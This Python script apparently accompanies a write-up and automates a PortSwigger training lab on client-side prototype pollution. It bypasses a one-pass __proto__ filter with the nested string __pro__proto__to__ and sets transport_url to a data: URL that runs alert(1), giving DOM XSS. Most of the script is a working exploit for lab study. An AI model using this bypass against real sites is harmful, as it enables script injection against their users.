#!/usr/bin/env python3
"""
Client-side prototype pollution via flawed sanitization
PortSwigger Web Security Academy -- Client-Side Prototype Pollution

Companion script for the writeup: 04-client-side-prototype-pollution-via-flawed-sanitization.md

What this does:
    Confirms the standard bracket- and dot-notation sources both fail
    (deparamSanitized.js strips __proto__ before merging), then bypasses
    the filter by nesting the blocked string inside itself:
    __pro__proto__to__ -- a single, non-recursive .replace() call removes
    the inner "proto__" once and leaves a valid "__proto__" behind. Combines
    that bypass with the same transport_url gadget from the unfiltered DOM
    XSS lab in this series (searchLogger.js reads config.transport_url with
    no default and uses it as a dynamically injected <script> src). Requires
    a real browser engine (Playwright) since the sanitizer, the pollution,
    and the sink only exist in client-side JS.

Usage:
    python 04-client-side-prototype-pollution-via-flawed-sanitization.py <lab-url>
    e.g. python 04-client-side-prototype-pollution-via-flawed-sanitization.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install playwright && playwright install chromium
"""

import sys
import time

from playwright.sync_api import sync_playwright


def solve(lab_url: str) -> None:
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        dialogs = []
        page.on("dialog", lambda d: (dialogs.append(d.message), d.accept()))

        # Both standard sources are filtered on this lab -- confirm the filter is live.
        page.goto(f"{lab_url}/?__proto__[foo]=bar", wait_until="networkidle")
        bracket_result = page.evaluate("() => Object.prototype.foo")
        page.goto(f"{lab_url}/?__proto__.foo=bar", wait_until="networkidle")
        dot_result = page.evaluate("() => Object.prototype.foo")
        if bracket_result == "bar" or dot_result == "bar":
            print("[!] A standard source worked unfiltered -- this script targets the sanitized lab")
        else:
            print("[*] Standard bracket and dot sources confirmed filtered, as expected")

        # Nested-string bypass: sanitizeKey() strips "proto__" once, leaving __proto__ intact.
        probe_url = f"{lab_url}/?__pro__proto__to__[pptest]=confirmed"
        page.goto(probe_url, wait_until="networkidle")
        bypass_result = page.evaluate("() => Object.prototype.pptest")
        if bypass_result != "confirmed":
            print("[-] __pro__proto__to__ bypass did not pollute Object.prototype -- aborting.")
            browser.close()
            return
        print("[+] Sanitizer bypass confirmed: __pro__proto__to__[foo]=bar pollutes Object.prototype")

        exploit_url = f"{lab_url}/?__pro__proto__to__[transport_url]=data:,alert(1);//"
        print(f"[*] Navigating to: {exploit_url}")
        page.goto(exploit_url, wait_until="networkidle")
        time.sleep(2)  # let searchLogger.js append the <script src> and fire it

        if dialogs:
            print(f"[+] alert() fired: {dialogs[0]!r} -- bypassed sanitizer, transport_url gadget reached script.src")
        else:
            print("[-] No alert() observed -- gadget may not have fired")

        check = page.goto(lab_url, wait_until="networkidle")
        html = check.text() if check else ""
        if "Congratulations" in html:
            print("[+] Lab solved.")
        else:
            print("[-] Not solved yet.")
        browser.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
